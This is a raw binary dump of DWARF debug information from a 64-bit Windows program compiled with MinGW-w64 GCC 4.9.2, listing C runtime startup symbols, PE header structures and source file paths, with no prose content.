SizeOfZeroFill |   
Characteristics |  $ IMAGE_TLS_DIRECTORY64 R  IMAGE_TLS_DIRECTORY *  _PVFV   __dyn_tls_init Rp  ¯  
u  RÚ  
‹  R|  
€  R’  pfunc T¯  ps UÐ    N  __dyn_tls_dtor Žp  0#@     /       œ  u  ŽÚ  ¹  ‹  Ž|  ò  €  Ž’  +  U#@     ¯   [  `#@     i       œ¿  v  d    ï  Œ  z  —  ¤  #@     &       ±  v      >  Œ  b  #@     &       —  ›  ¤  Ó    Ç#@     ¯   __tlregdtor s÷   Ð#@            œ÷  func sN  R __xd_a EN  	X@     __xd_z FN  	`@     _tls_index )T  	Ly@     _tls_start /
  	  @     _tls_end 0
  	` @     __xl_a 2  	8@     __xl_z 3  	P@     _tls_used 5Ä  	  @     2  _CRT_MT M÷   __dyn_tls_init_callback m  	 B@       __xl_c n  	@@     __xl_d °  	H@     mingw_initltsdrot_force ³÷   	Hy@     mingw_initltsdyn_force ´÷   	Dy@     mingw_initltssuo_force µ÷   	@y@     __mingw_TLScallback a  	Ú  	|  	’    ®   ”  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/cinitexe.c Ì
  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char _PVFV :  @  -  Q   û     __xi_a 
A  	@     __xi_z 
A  	0@     __xc_a A  	 @     __xc_z 
A  	@      +   í  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/natstart.c *  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int double long double tagCOINITBASE •  COINITBASE_MULTITHREADED   VARENUM  1  VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ ”  q  __uninitialized  __initializing __initialized   ”  Ÿ1  __native_startup_state 
¤  	 z@     	q  __native_startup_lock Ð  	(z@     
Ö  
__native_dllmain_reason 
   	$0@     	ë   __native_vcclrit_reason    	 0@      °    o  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/wildcard.c /  _dowildcard  ¬   	Py@     int  ­    ™  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/_newmode.c   _newmode  ©   	`y@     int  «    Ã  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/xtxtmode.c ë  _fmode §   	py@     int  Ô   í  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/atonexit.c à#@     É       I  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int _onexit_t (u  {  è   double long double Ÿ   tagCOINITBASE •Ò  	COINITBASE_MULTITHREADED   
VARENUM  f  	VT_EMPTY  	VT_NULL 	VT_I2 	VT_I4 	VT_R4 	VT_R8 	VT_CY 	VT_DATE  	VT_BSTR 	VT_DISPATCH 		VT_ERROR 
	VT_BOOL 
	VT_VARIANT 	VT_UNKNOWN 
	VT_DECIMAL 	VT_I1 	VT_UI1 	VT_UI2 	VT_UI4 	VT_I8 	VT_UI8 	VT_INT 	VT_UINT 	VT_VOID 	VT_HRESULT 	VT_PTR 	VT_SAFEARRAY 	VT_CARRAY 	VT_USERDEFINED 	VT_LPSTR 	VT_LPWSTR 	VT_RECORD $	VT_INT_PTR %	VT_UINT_PTR &	VT_FILETIME À 	VT_BLOB Á 	VT_STREAM Â 	VT_STORAGE Ã 	VT_STREAMED_OBJECT Ä 	VT_STORED_OBJECT Å 	VT_BLOB_OBJECT Æ 	VT_CF Ç 	VT_CLSID È 	VT_VERSIONED_STREAM É 	VT_BSTR_BLOB ÿ	VT_VECTOR € 	VT_ARRAY €À 	VT_BYREF €€	VT_RESERVED €€	VT_ILLEGAL ÿÿ	VT_ILLEGALMASKED ÿ	VT_TYPEMASK ÿ _PVFV ™  
mingw_onexit !d  à#@     §       œ  func !d    
onexitbegin #  ‘`
onexitend $  ‘hretval %d  ‡  ô#@     D  	$@     e  
  R8 $@     D  &$@     D  =$@     x  K  Rs Q‘`X‘h J$@     ¥  [$@     ¥  l$@     Æ  |  R8 $@     Rs   f  atexit Tè   $@            œÞ  func 8f  Ð  ™$@     s  RóR  __onexitbegin   	0z@     __onexitend   	8z@     d  )  d   __imp__onexit >    _decode_pointer °=  e  =   _lock x  è    __dllonexit d  Ÿ  d  Ÿ  Ÿ     _encode_pointer ®=  Æ  =   _unlock è     æ   h  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/charmax.c °$@     
       Ž  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int g  ç   double long double tagCOINITBASE •·  COINITBASE_MULTITHREADED    VARENUM  K  VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ _PIFV a  	my_lconv_init ç   °$@     
       œ  
º$@      
mingw_initcharmax ç   	€y@     
_charmax ç   	00@     
__mingw_pinit K  	(@      n     GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/pesect.c À$@     ž      ¨  char size_t #³    long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char WINBOOL ô   BYTE ‹8  WORD ŒÞ   DWORD #  float PBYTE •  Z  LPVOID ™I  signed char short int ULONG_PTR 1³   DWORD_PTR ¿Å  LONG û   ULONGLONG ä³   double long double  Z  /      	_IMAGE_DOS_HEADER @±„  
e_magic ²f   
e_cblp ³f  
e_cp ´f  
e_crlc µf  
e_cparhdr ¶f  
e_minalloc ·f  

e_maxalloc ¸f  
e_ss ¹f  
e_sp ºf  
e_csum »f  
e_ip ¼f  
e_cs ½f  
e_lfarlc ¾f  
e_ovno ¿f  
e_res À„  
e_oemid Áf  $
e_oeminfo Âf  &
e_res2 Ã”  (
e_lfanew Äç  <  f  ”      f  ¤    	 IMAGE_DOS_HEADER Å/  PIMAGE_DOS_HEADER Å×  /  	_IMAGE_FILE_HEADER  ”  
Machine !f   
NumberOfSections "f  
µ  #r  
PointerToSymbolTable $r  
NumberOfSymbols %r  
SizeOfOptionalHeader &f  
Í  'f   IMAGE_FILE_HEADER (Ý  	_IMAGE_DATA_DIRECTORY \é  
è  ]r   
Size ^r   IMAGE_DATA_DIRECTORY _®   é       	_IMAGE_OPTIONAL_HEADER64 ð–D  
Magic —f   
MajorLinkerVersion ˜Z  
MinorLinkerVersion ™Z  
SizeOfCode šr  
SizeOfInitializedData ›r  
SizeOfUninitializedData œr  
AddressOfEntryPoint r  
BaseOfCode žr  
ImageBase Ÿô  
SectionAlignment  r   
FileAlignment ¡r  $
MajorOperatingSystemVersion ¢f  (
MinorOperatingSystemVersion £f  *
MajorImageVersion ¤f  ,
MinorImageVersion ¥f  .
MajorSubsystemVersion ¦f  0
MinorSubsystemVersion §f  2
Win32VersionValue ¨r  4
SizeOfImage ©r  8
SizeOfHeaders ªr  <
CheckSum «r  @
Subsystem ¬f  D
DllCharacteristics ­f  F
SizeOfStackReserve ®ô  H
SizeOfStackCommit ¯ô  P
SizeOfHeapReserve °ô  X
SizeOfHeapCommit ±ô  `
LoaderFlags ²r  h
NumberOfRvaAndSizes ³r  l
DataDirectory ´  p IMAGE_OPTIONAL_HEADER64 µ  PIMAGE_OPTIONAL_HEADER64 µ…    PIMAGE_OPTIONAL_HEADER Âd  _IMAGE_NT_HEADERS64 Ì	  
Signature Ír   
FileHeader Î”  
OptionalHeader ÏD   PIMAGE_NT_HEADERS64 Ð$	  ª  PIMAGE_NT_HEADERS ß	  
;z	  PhysicalAddress <r  VirtualSize =r   	_IMAGE_SECTION_HEADER (9w
  
Name :   
Misc >D	  
è  ?r  
SizeOfRawData @r  
PointerToRawData Ar  
PointerToRelocations Br  
PointerToLinenumbers Cr  
NumberOfRelocations Df   
NumberOfLinenumbers Ef  "
Í  Fr  $ PIMAGE_SECTION_HEADER G•
  z	  
7Ì
  Í  8r  OriginalFirstThunk 9r   	_IMAGE_IMPORT_DESCRIPTOR 6<
  ›
   
µ  ;r  
ForwarderChain =r  
Name >r  
FirstThunk ?r   IMAGE_IMPORT_DESCRIPTOR @Ì
  PIMAGE_IMPORT_DESCRIPTOR A}
  <
  _ValidateImageBase K  Ý
  Ý  ˆ  pDOSHeader ½  Ã  *	  pOptHeader ‹   ƒ
  À$@            œ  ¢
  	   ­
  ¿
  RÊ
  rŸ ƒ
  à$@            œ\  ¢
  B   ­
  {   ¿
  Ê
  ò$@     Ý
   _FindPESection -w
   %@     E       œÒ  Ý  -ˆ  ´   rva -Ö  QÃ  /*	  í   ¬  0w
  4!  ÷  1   W!   _FindPESectionByName Cw
  P%@     ž       œË
  pName CË
  {!  Ý  Eˆ  Ã  F*	  "  ¬  Gw
  <"  ÷  H   r"   ƒ
  e%@       O“
  !¢
  "  ­
  ¿
  Ê
  #˜%@     Ý
  $Rs    %_%@     :  «
  $Rt  #Ü%@     R  $Rs $Qt $X8  Ñ
  &   __mingw_GetSectionForAddress bw
  ð%@     C       œ‡  p b›  –"  Ý  dˆ  rva eÖ   ƒ
  ö%@     P  hy  !¢
  "P  ­
  ¿
  Ê
  #&@     Ý
  $Rs    3&@     \   __mingw_GetSectionCount pô   @&@     ;       œ  Ý  rˆ  Ã  s*	  'ƒ
  E&@     €  v!¢
  "€  ­
  ¿
  Ê
  #h&@     Ý
  $Rs     _FindPESectionExec ‚w
  €&@     Ž       œÍ  eNo ‚¥   
#  Ý  „ˆ  Ã  …*	  #  (¬  †w
  Q÷  ‡   Æ#  'ƒ
  ‡&@     À  Š!¢
  "À  ­
  ¿
  Ê
  #­&@     Ý
  $Rt     _GetPEImageBase  ˆ  '@     8       œH  Ý  ¢ˆ  'ƒ
  '@        ¤!¢
  "   ­
  ¿
  Ê
  #8'@     Ý
  $Rt     _IsNonwritableInCurrentImage ¬K  P'@     U       œ!  pTarget ¬ˆ  ê#  Ý  ®ˆ  rvaTarget ¯Ö  ¬  °w
  _$   ƒ
  V'@     @  ³  !¢
  "@  ­
  ¿
  Ê
  #{'@     Ý
  $Rs    #'@     \  $Rs $Qt   __mingw_enum_import_library_names ÀË
  °'@     ®       œ$  i Àô   •$  Ý  Âˆ  Ã  Ã*	  )importDesc Ä\
  %  ¬  Åw
  h%  )importsStartRVA Ær  ‹%   ƒ
  ¸'@     €  É	  !¢
  "€  ­
  ¿
  Ê
  #è'@     Ý
  $Ru    #(@     \  $Ru $Qs   *__image_base__ ¤  +strlen 6¥   R  ,Ë
   -strncmp Lô   ,Ë
  ,Ë
  ,¥     ÿ    T  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/pseudo-reloc-list.c š  __RUNTIME_PSEUDO_RELOC_LIST_END__  Ë   	‘y@     char __RUNTIME_PSEUDO_RELOC_LIST__ Ë   	y@      Š   ~  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/tlsthrd.c `(@     '        char size_t #´    long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char WINBOOL õ   WORD Œß   DWORD $  float LPVOID ™J  signed char short int ULONG_PTR 1´   LONG ü   HANDLE ŽJ  _LIST_ENTRY ]   Flink ^    Blink _   Ô  LIST_ENTRY `Ô  double long double _RTL_CRITICAL_SECTION_DEBUG 0T2   Type U[    CreatorBackTraceIndex V[   CriticalSection WÐ   ProcessLocksList X   EntryCount Yg    ContentionCount Zg  $ Flags [g  ( CreatorBackTraceIndexHigh \[  , SpareWORD ][  . _RTL_CRITICAL_SECTION (oÐ   DebugInfo pÖ    LockCount q¸   RecursionCount r¸   OwningThread sÅ   LockSemaphore tÅ   SpinCount u§    2  PRTL_CRITICAL_SECTION_DEBUG ^ú  :  RTL_CRITICAL_SECTION v2  CRITICAL_SECTION    ;  	F  
J   __mingwthr_key_t ^  
__mingwthr_key œ  key  g   dtor !5  next "œ   ¢  
F  __mingwthr_run_key_dtors bä  keyp dœ  value l}    §  `(@     m       œj  È  Û%  (@            7  Õ  þ%  «(@     Rt   u(@     R  R	Ày@      Í(@     R	Ày@       ___w64_mingwthr_add_key_dtor )õ   Ð(@            œ%  key )g  4&  dtor )5  ¼&  new_key +%  D'  )@     `  ò  R1QH )@     
  R	Ày@      >)@     R	Ày@       F  ___w64_mingwthr_remove_key_dtor @õ   P)@     Ÿ       œù  key @g   '  prev_key Bœ  ÿ'  cur_key Cœ  ](  )@     ¹  R	Ày@      ´)@     Ô  R	Ày@      Ð)@     ~  Ý)@     R	Ày@       __mingw_TLScallback yL  ð)@     —       œù   hDllHandle yÅ  ò(  reason zg  ø)  reserved {}  þ*  §   *@     À  –   À  È  u*@     ä    §  *@     ð  …Æ   ð  È  …*@     ä    @*@     á   R	Ày@      m*@     R	Ày@        __mingwthr_cs   	Ày@      __mingwthr_cs_init <  	¨y@     
õ    key_dtor_list &œ  	 y@     !calloc  ·J  ~  
¦   
¦    "free  ¸
J    «    3  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/tlsmcrt.c y  _CRT_MT §   	@0@     int  ¦    ]  Ö  *@     Â*@     ../../../../../src/gcc-4.9.2/libgcc/config/i386/cygwin.S C:\crossdev\gccmaster\build-tdm64\gcc\x86_64-w64-mingw32\libgcc GNU AS 2.24.51 €ð   q  GNU C 4.9.2 -mtune=generic -march=x86-64 -g -O2 -O2 -O2 -fbuilding-libgcc -fno-stack-protector ../../../../../src/gcc-4.9.2/libgcc/libgcc2.c C:\crossdev\gccmaster\build-tdm64\gcc\x86_64-w64-mingw32\libgcc Q  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char double float long double ¤  short int ix86_tune_indices I‡
  X86_TUNE_SCHEDULE  X86_TUNE_PARTIAL_REG_DEPENDENCY X86_TUNE_SSE_PARTIAL_REG_DEPENDENCY X86_TUNE_SSE_SPLIT_REGS X86_TUNE_PARTIAL_FLAG_REG_STALL X86_TUNE_MOVX X86_TUNE_MEMORY_MISMATCH_STALL X86_TUNE_FUSE_CMP_AND_BRANCH_32  X86_TUNE_FUSE_CMP_AND_BRANCH_64 X86_TUNE_FUSE_CMP_AND_BRANCH_SOFLAGS 	X86_TUNE_FUSE_ALU_AND_BRANCH 
X86_TUNE_REASSOC_INT_TO_PARALLEL 
X86_TUNE_REASSOC_FP_TO_PARALLEL X86_TUNE_ACCUMULATE_OUTGOING_ARGS 
X86_TUNE_PROLOGUE_USING_MOVE X86_TUNE_EPILOGUE_USING_MOVE X86_TUNE_USE_LEAVE X86_TUNE_PUSH_MEMORY X86_TUNE_SINGLE_PUSH X86_TUNE_DOUBLE_PUSH X86_TUNE_SINGLE_POP X86_TUNE_DOUBLE_POP X86_TUNE_PAD_SHORT_FUNCTION X86_TUNE_PAD_RETURNS X86_TUNE_FOUR_JUMP_LIMIT X86_TUNE_SOFTWARE_PREFETCHING_BENEFICIAL X86_TUNE_LCP_STALL X86_TUNE_READ_MODIFY X86_TUNE_USE_INCDEC X86_TUNE_INTEGER_DFMODE_MOVES X86_TUNE_OPT_AGU X86_TUNE_AVOID_LEA_FOR_ADDR X86_TUNE_SLOW_IMUL_IMM32_MEM  X86_TUNE_SLOW_IMUL_IMM8 !X86_TUNE_AVOID_MEM_OPND_FOR_CMOVE "X86_TUNE_SINGLE_STRINGOP #X86_TUNE_MISALIGNED_MOVE_STRING_PRO_EPILOGUES $X86_TUNE_USE_SAHF %X86_TUNE_USE_CLTD &X86_TUNE_USE_BT 'X86_TUNE_USE_HIMODE_FIOP (X86_TUNE_USE_SIMODE_FIOP )X86_TUNE_USE_FFREEP *X86_TUNE_EXT_80387_CONSTANTS +X86_TUNE_VECTORIZE_DOUBLE ,X86_TUNE_GENERAL_REGS_SSE_SPILL -X86_TUNE_SSE_UNALIGNED_LOAD_OPTIMAL .X86_TUNE_SSE_UNALIGNED_STORE_OPTIMAL /X86_TUNE_SSE_PACKED_SINGLE_INSN_OPTIMAL 0X86_TUNE_SSE_TYPELESS_STORES 1X86_TUNE_SSE_LOAD0_BY_PXOR 2X86_TUNE_INTER_UNIT_MOVES_TO_VEC 3X86_TUNE_INTER_UNIT_MOVES_FROM_VEC 4X86_TUNE_INTER_UNIT_CONVERSIONS 5X86_TUNE_SPLIT_MEM_OPND_FOR_FP_CONVERTS 6X86_TUNE_USE_VECTOR_FP_CONVERTS 7X86_TUNE_USE_VECTOR_CONVERTS 8X86_TUNE_AVX256_UNALIGNED_LOAD_OPTIMAL 9X86_TUNE_AVX256_UNALIGNED_STORE_OPTIMAL :X86_TUNE_AVX128_OPTIMAL ;X86_TUNE_DOUBLE_WITH_ADD <X86_TUNE_ALWAYS_FANCY_MATH_387 =X86_TUNE_UNROLL_STRLEN >X86_TUNE_SHIFT1 ?X86_TUNE_ZERO_EXTEND_WITH_AND À X86_TUNE_PROMOTE_HIMODE_IMUL Á X86_TUNE_FAST_PREFIX Â X86_TUNE_READ_MODIFY_WRITE Ã X86_TUNE_MOVE_M1_VIA_OR Ä X86_TUNE_NOT_UNPAIRABLE Å X86_TUNE_PARTIAL_REG_STALL Æ X86_TUNE_PROMOTE_QIMODE Ç X86_TUNE_PROMOTE_HI_REGS È X86_TUNE_HIMODE_MATH É X86_TUNE_SPLIT_LONG_MOVES Ê X86_TUNE_USE_XCHGB Ë X86_TUNE_USE_MOV0 Ì X86_TUNE_NOT_VECTORMODE Í X86_TUNE_AVOID_VECTOR_DECODE Î X86_TUNE_AVOID_FALSE_DEP_FOR_BMI Ï X86_TUNE_BRANCH_PREDICTION_HINTS Ð X86_TUNE_QIMODE_MATH Ñ X86_TUNE_PROMOTE_QI_REGS Ò X86_TUNE_ADJUST_UNROLL Ó X86_TUNE_LAST Ô  ix86_arch_indices Ð  X86_ARCH_CMOV  X86_ARCH_CMPXCHG X86_ARCH_CMPXCHG8B X86_ARCH_XADD X86_ARCH_BSWAP X86_ARCH_LAST  signed char __int128  __int128 unsigned complex float complex double  complex long double __float128  __unknown__  func_ptr *ž  “  ³  	J   
__CTOR_LIST__ 	£  	 ,@     
__DTOR_LIST__ 	£  	°,@      Ç    ä  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/misc/mingw_matherr.c ï  _MINGW_INSTALL_DEBUG_MATHERR Ã   	P0@     int  \     GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/misc/invalid_parameter_handler.c ð*@            S  char  long long unsigned int long long int uintptr_t K¹   wchar_t b   short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int double long double µ  Ô   Ô   Ô   Ô   -   ä    Ú  õ   	tagCOINITBASE •  
COINITBASE_MULTITHREADED   
VARENUM  ¥  
VT_EMPTY  
VT_NULL 
VT_I2 
VT_I4 
VT_R4 
VT_R8 
VT_CY 
VT_DATE  
VT_BSTR 
VT_DISPATCH 	
VT_ERROR 

VT_BOOL 

VT_VARIANT 
VT_UNKNOWN 
VT_DECIMAL 
VT_I1 
VT_UI1 
VT_UI2 
VT_UI4 
VT_I8 
VT_UI8 
VT_INT 
VT_UINT 
VT_VOID 
VT_HRESULT 
VT_PTR 
VT_SAFEARRAY 
VT_CARRAY 
VT_USERDEFINED 
VT_LPSTR 
VT_LPWSTR 
VT_RECORD $
VT_INT_PTR %
VT_UINT_PTR &
VT_FILETIME À 
VT_BLOB Á 
VT_STREAM Â 
VT_STORAGE Ã 
VT_STREAMED_OBJECT Ä 
VT_STORED_OBJECT Å 
VT_BLOB_OBJECT Æ 
VT_CF Ç 
VT_CLSID È 
VT_VERSIONED_STREAM É 
VT_BSTR_BLOB ÿ
VT_VECTOR € 
VT_ARRAY €À 
VT_BYREF €€
VT_RESERVED €€
VT_ILLEGAL ÿÿ
VT_ILLEGALMASKED ÿ
VT_TYPEMASK ÿ _InterlockedExchangePointer ûo  ì  
Target ûì  
Value ûo   ò  o  mingw_get_invalid_parameter_handler ¯  ð*@            œmingw_set_invalid_parameter_handler ¯   +@     
       œº  new_handler ¯  R¥   +@     
       Ý  RÎ  
 z@     Ÿ  handler ¯  	 z@     ¯  â   ¯   __imp__set_invalid_parameter_handler 
  	h0@     Ó  ¯  __imp__get_invalid_parameter_handler Y  	`0@                                                                                                                                                                                                                                                                                                                                                                                                              %
   $ 

>
   :
;
I   

I  

:
;  
 :
;I8
   
 :
;I8
   

  	
:
;  

 I8  

 :
;I8  &   
 :
;I  'I   I  I  ! I/
   'I   '  '  & I  
:
;  
:
;  
 :
;I  
 I  

:
;  
 I8
  

:
;
  
 :
;
I8
  

:
;
  ( 
   

:
;  !

:
;
  "

:
;
  # :
;
I  $.?:
;'I 
  % :
;I  &4 :
;I  ' <  (. ?:
;'I 
  )5 I  *.:
;' 
  +
  ,.:
;
' @—B  - :
;
I  ..:
;'I 
  /.:
;
'I @—B  01RUX
Y
  1
U  24 1  34 1  4‰‚1  5Š‚ ‘B  6‰‚ 1  7‰‚1  8Š‚   94 :
;
I  :4 :
;
I  ;
U  <1 X
Y
  =1 X
Y  > 1  ?
   @ 1  A1RUX
Y  B
   C1 X
Y  D‰‚  E‰‚  F.?:
;
'I @—B  G4 :
;
I?<  H5   I!   J4 :
;
I?  K4 :
;I?<  L.?:
;
'<  M.?:
;
'I<  N. ?:
;
'I<  O.?:
;'I<  P.?'I4<  Q. ?:
;
'<  R.?:
;'<   %
   $ 

>
   

  

:
;
  ( 
  

:
;   .?:
;
'I @—B   :
;
I  	4 :
;
I?   %
   $ 

>
  . ?:
;
'I @—B   %
   $ 

>
   

I  

:
;
  ( 
  

:
;   

:
;
  
 :
;
I8
  	 :
;
I  
& I  
'I   I  
.?:
;
' @—B   :
;
I   :
;
I  4 :
;
I  ‰‚  Š‚ ‘B  ‰‚•B1  .?:
;'I @—B  4 :
;
I  ‰‚ 1  ‰‚1  .?:
;
'<  . ?:
;
'I<  .?:
;'I<      %
    :
;
I   

I  $ 

>
   

I   

   &   

:
;  	
 :
;I8
  
 :
;I  
I  ! I/
  


:
;  
 :
;I  

:
;
  ( 
  

:
;  

:
;
  
 :
;
I8
  

:
;
  

:
;
   :
;
I  .:
;' 
   :
;I  4 :
;I  
  .:
;
' @—B   :
;
I     4 :
;
I  ‰‚ 1   ‰‚1  !Š‚ ‘B  "& I  #.:
;
' 
  $ :
;
I  %4 :
;
I  &.1 @–B  ' 1  (1RUX
Y  )
U  *4 1  +4 1  ,‰‚  -‰‚1  .‰‚•B1  /.?:
;' @—B  04 :
;I  14 :
;I  2 1  3
   41RUX
Y  54 :
;
I?<  6. ?:
;
'I<  7.?:
;
n'I<  8 I  9.?:
;'I<  :. ?:
;'<  ;.?:
;
'I<  <.?'I4<   %
   $ 

>
   :
;
I   

I  '   I   

:
;  
 :
;I8
  	
 :
;I8
  
 

  

:
;  
 I8  

 :
;I8   :
;I  I  ! I/
  
:
;  
:
;  
 :
;I  
 I  

:
;  'I  

:
;
  ( 
  

:
;  

:
;
  
 :
;
I8
  .?:
;
'I @—B   :
;
I   :
;
I  4 :
;
I   4 :
;
I  !‰‚1  "Š‚ ‘B  #‰‚  $‰‚ 1  %‰‚1  &4 :
;
I  '‰‚  (‰‚•B  )4 :
;
I?  *.?:
;
'I<  +. ?:
;
'<  ,. ?:
;
'I<  -& I  ..?:
;
'I<   %
   . ?:
;
' @—B   %
   $ 

>
   :
;
I   

I   '  

:
;
   ( 
  

:
;  	.?:
;
' @–B  
4 :
;
I  
4 :
;
I  ‰‚•B1  
Š‚ ‘B  .?:
;
' @—B  ‰‚ •B1  I  !   4 :
;
I?<  .?:
;'I<   I   %
   $ 

>
   

I  

:
;  
 :
;I8
  
 :
;I8
    

  
:
;  	
 I8  

 :
;I8  
 :
;
I   :
;I  


:
;  

:
;  
 I  
 :
;I  I  ! I/
  
:
;  
:
;  

:
;
  
 :
;
I8
  

:
;
  
 :
;
I  .?:
;
' @–B  4 :
;
I  4 :
;
I  ‰‚  Š‚ ‘B  ‰‚   :
;
I   ‰‚ 1  !5 I  "& I  #4 :
;
I?  $. ?:
;'<   %
   $ 

>
   :
;
I   

I   

   :
;I    '  '  	 I  


:
;  

 :
;I8
  .?:
;
'I 
  
 :
;
I  4 :
;
I  .:
;
'I @—B   :
;
I  ‰‚ 1  .1 @–B   1  4 1  
   
   4 1  .?:
;
'I @—B   :
;
I  4 :
;
I  4 :
;
I?  & I  4 :
;
I?<  .?:
;
'I<   %
  $ 

>
   :
;
I   

I   '  I   ! I/
  4 :
;
I?   %
  $ 

>
  

:
;
  ( 
  

:
;  

:
;
    :
;
I  4 :
;
I?  	5 I  
 

I  
5    %
  4 :
;
I?  $ 

>
   %
  4 :
;
I?  $ 

>
   %
  4 :
;
I?  $ 

>
   %
   $ 

>
   

   :
;
I   

I   'I    '  

:
;
  	( 
  


:
;  
.?:
;
'I @—B   :
;
I  
4 :
;
I  4 :
;
I  ‰‚ 1  ‰‚1  Š‚ ‘B  ‰‚  .?:
;'I @—B  ‰‚1  4 :
;
I?  'I   I  4 :
;
I?<  .?:
;
'I<  .?:
;
'<  .?:
;
'<   %
   $ 

>
   

I   'I  

:
;
  ( 
   

:
;   :
;
I  	.:
;
'I @—B  
‰‚ •B  
4 :
;
I?   %
   $ 

>
   :
;
I   

   

I   :
;I   I  ! I/
  	

:
;  

 :
;I8
  

 :
;I8
  
:
;  


:
;  
 :
;I  
 :
;I  
 I8
  .?:
;
'I 
   :
;
I  4 :
;
I  4 :
;
I  .1 @—B   1  4 1  4 1  4 1  ‰‚ •B1  .?:
;
'I @—B   :
;
I   :
;
I  4 :
;
I   :
;
I   1RUX
Y
  ! 1  "
U  #‰‚1  $Š‚ ‘B  %‰‚1  && I  '1RUX
Y
  (4 :
;
I  )4 :
;
I  *4 :
;
I?<  +.?:
;
'I<  , I  -.?:
;
'I<   %
  4 :
;
I?  $ 

>
   %
   $ 

>
   :
;
I   

   :
;I  

:
;   
 :
;I8
   

I  	'  
 I  


:
;
  
 :
;
I8
  
5 I  .:
;
' 
  4 :
;
I  
  .1 @–B  4 1  
   ‰‚  Š‚ ‘B  ‰‚  ‰‚•B  .?:
;
'I @—B   :
;
I  4 :
;
I  ‰‚1  ‰‚ 1  1RUX
Y
  
U  4 1   4 :
;
I  !.?:
;'I<  ".?:
;'<   %
  4 :
;
I?  $ 

>
    %   %
  $ 

>
   

I   '  

:
;  ( 
    :
;
I  I  	! I/
  
4 :
;I?   %
  4 :
;
I?  $ 

>
   %
   $ 

>
   :
;
I   

   

I  '    I  & I  	

:
;
  
( 
  


:
;  .?:
;'I 
  
 :
;I  5 I  . :
;
'I @—B  .:
;
'I @—B   :
;
I  1 X
Y
   1  4 :
;
I  'I  4 :
;
I?   'I                                                                                                                                                                                                                                                                                                                                                                                                                                                                       -   ý  û
